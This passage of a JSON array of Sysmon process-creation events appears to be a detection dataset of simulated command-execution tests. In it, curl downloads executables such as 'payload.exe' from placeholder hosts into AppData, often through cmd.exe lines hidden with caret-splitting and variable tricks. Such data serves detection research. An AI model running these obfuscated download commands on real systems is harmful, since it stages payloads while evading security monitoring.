    {
      "row_id": 134,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 203720,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_026.evtx",
      "ParentCommandLine": "cmd.exe /v:ON /C \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-D495-6A2E-2C06-000000002C00",
      "ParentProcessId": 9972,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-D495-6A2E-2D06-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T16:19:33.462683Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 16:19:33.439",
      "Version": 5
    },
    {
      "row_id": 196,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  -o %%AppData%%\\test.exe http://[example.com/test.exe]()",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 207684,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_491.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl -o %A^ppData%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E1C9-6A2E-F80D-000000002C00",
      "ParentProcessId": 4224,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E1C9-6A2E-F90D-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:15:53.459513Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:15:53.455",
      "Version": 5
    },
    {
      "row_id": 198,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  -o %%AppData%%\\test.exe http://[example.com/test.exe]()",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 207728,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_492.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl -o %A^ppData%\\test.exe h^t^t^p://[example.com/test.exe]()\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E1DE-6A2E-0E0E-000000002C00",
      "ParentProcessId": 12136,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E1DF-6A2E-0F0E-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:16:15.016489Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:16:15.012",
      "Version": 5
    },
    {
      "row_id": 200,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  https://example.com/file.exe -o %%APPDATA%%\\file.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 207805,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_496.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl h^tt^ps://example.com/file.exe -o %AP^PDATA%\\file.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E21E-6A2E-310E-000000002C00",
      "ParentProcessId": 6792,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E21E-6A2E-320E-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:17:18.928071Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:17:18.926",
      "Version": 5
    },
    {
      "row_id": 202,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/file.exe -o C:\\Users\\thaim\\AppData\\Roaming\\file.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 207845,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_497.evtx",
      "ParentCommandLine": "cmd.exe /c \"set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\\AppData\\Roaming\\file.exe&& call curl %protocol%%url% -o %dest%\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E234-6A2E-450E-000000002C00",
      "ParentProcessId": 4480,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E234-6A2E-460E-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:17:40.932387Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:17:40.929",
      "Version": 5
    },
    {
      "row_id": 204,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/file.exe -o C:\\Users\\thaim\\AppData\\Roaming\\file.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 207897,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_498.evtx",
      "ParentCommandLine": "cmd.exe /C \"set protocol=http&& set url=://example.com/file.exe&& set dest=%USERPROFILE%\\AppData\\Roaming\\file.exe&& call curl %protocol%%url% -o %dest%\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E24A-6A2E-5F0E-000000002C00",
      "ParentProcessId": 11840,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E24A-6A2E-600E-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:18:02.730763Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:18:02.727",
      "Version": 5
    },
    {
      "row_id": 206,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  https://[example.com/payload.exe]() -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 207949,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_500.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E261-6A2E-790E-000000002C00",
      "ParentProcessId": 5248,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E261-6A2E-7A0E-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:18:25.969880Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:18:25.966",
      "Version": 5
    },
    {
      "row_id": 208,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  https://[example.com/payload.exe]() -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 207989,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_501.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl h^t^t^p^s^:^/^/[example.com/payload.exe]() -o %AppData%\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E273-6A2E-8D0E-000000002C00",
      "ParentProcessId": 9564,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E273-6A2E-8E0E-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:18:43.558286Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:18:43.555",
      "Version": 5
    },
    {
      "row_id": 210,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 208040,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_502.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl http://example.com/payload.exe -o %USERPROFILE%\\AppData\\Roaming\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E285-6A2E-A60E-000000002C00",
      "ParentProcessId": 11716,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E285-6A2E-A80E-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:19:01.563656Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:19:01.549",
      "Version": 5
    },
    {
      "row_id": 212,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 208087,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_503.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl http://example.com/payload.exe -o %USERPROFILE%\\AppData\\Roaming\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E297-6A2E-BE0E-000000002C00",
      "ParentProcessId": 12180,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E297-6A2E-BF0E-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:19:19.237568Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:19:19.234",
      "Version": 5
    },
    {
      "row_id": 214,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 208133,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_504.evtx",
      "ParentCommandLine": "cmd.exe /c \"curl http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E2A9-6A2E-D50E-000000002C00",
      "ParentProcessId": 6684,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E2A9-6A2E-D60E-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:19:37.354049Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:19:37.351",
      "Version": 5
    },
    {
      "row_id": 216,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 208173,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_505.evtx",
      "ParentCommandLine": "cmd.exe /C \"curl http://example.local/test.txt -o C:\\Users\\Public\\AppData\\Roaming\\test.txt\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E2C1-6A2E-E90E-000000002C00",
      "ParentProcessId": 5704,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E2C1-6A2E-EA0E-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:20:01.028863Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:20:01.025",
      "Version": 5
    },
    {
      "row_id": 219,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.local/test.txt -o C:\\Users\\thaim\\AppData\\Roaming\\test.txt",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 208220,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_506.evtx",
      "ParentCommandLine": "cmd  /c curl http://example.local/test.txt -o C:\\Users\\thaim\\%A%%D%\\Roaming\\test.txt",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E2D9-6A2E-010F-000000002C00",
      "ParentProcessId": 3416,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E2D9-6A2E-020F-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
      "SHA256": "642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE",
      "SystemTime": "2026-06-14T17:20:25.348576Z",
      "Task": 1,
      "TerminalSessionId": 1,
      "ThreadID": 3864,
      "User": "thaimx\\thaim",
      "UserID": "S-1-5-18",
      "UtcTime": "2026-06-14 17:20:25.344",
      "Version": 5
    },
    {
      "row_id": 221,
      "Channel": "Microsoft-Windows-Sysmon/Operational",
      "CommandLine": "curl  http://example.com/payload.exe -o C:\\Users\\thaim\\AppData\\Roaming\\payload.exe",
      "Company": "curl, https://curl.se/",
      "Computer": "thaimx",
      "CurrentDirectory": "C:\\DATN1\\",
      "Description": "The curl executable",
      "EventID": 1,
      "EventRecordID": 208278,
      "FileVersion": "8.19.0",
      "Guid": "5770385F-C22A-43E0-BF4C-06F5698FFBD9",
      "Hashes": "MD5=29EFEB52BFD1E15CC3A5F010C1B0BB7F,SHA256=642A07EEEA4D3132426E673FB3C88BE8CEAD3D03CA1F019C7E7D0000ED2122BE,IMPHASH=1543E9CA83D6C3ACB3B4DD027999FCF4",
      "IMPHASH": "1543E9CA83D6C3ACB3B4DD027999FCF4",
      "Image": "C:\\Windows\\System32\\curl.exe",
      "IntegrityLevel": "High",
      "Keywords": "0x8000000000000000",
      "Level": 4,
      "LogonGuid": "20525DD1-B76B-6A2E-D0C3-010000000000",
      "LogonId": "0x1c3d0",
      "MD5": "29EFEB52BFD1E15CC3A5F010C1B0BB7F",
      "Opcode": 0,
      "OriginalFileName": "curl.exe",
      "OriginalLogfile": "t1059.001__t1059.001_507.evtx",
      "ParentCommandLine": "cmd.exe /V:ON /c \"curl http://example.com/payload.exe -o !AppData!\\payload.exe\"",
      "ParentImage": "C:\\Windows\\System32\\cmd.exe",
      "ParentProcessGuid": "20525DD1-E2F6-6A2E-1F0F-000000002C00",
      "ParentProcessId": 9492,
      "ParentUser": "thaimx\\thaim",
      "ProcessGuid": "20525DD1-E2F6-6A2E-200F-000000002C00",
      "ProcessID": "3836",
      "Product": "The curl executable",
      "Provider_Name": "Microsoft-Windows-Sysmon",
      "RuleName": "-",
